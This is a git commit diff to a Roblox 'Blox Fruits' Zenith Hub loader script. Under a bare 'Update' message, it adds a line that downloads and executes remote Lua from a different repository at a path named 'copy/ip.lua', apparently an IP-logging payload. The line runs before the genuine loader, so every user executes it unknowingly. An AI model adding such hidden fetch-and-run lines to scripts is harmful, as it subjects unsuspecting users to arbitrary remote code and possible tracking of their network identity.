e7af995bd085ddc53c85a6e5fbf4ec4c45494442
xielbers <88589081+xielbers@users.noreply.github.com>
2025-03-26 11:46:20 -0300

    Update blox-fruits_zenith-hub.lua

--- blox-fruits_zenith-hub.lua
+++ blox-fruits_zenith-hub.lua
@@ -1,1 +1,3 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/copy/ip.lua'))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
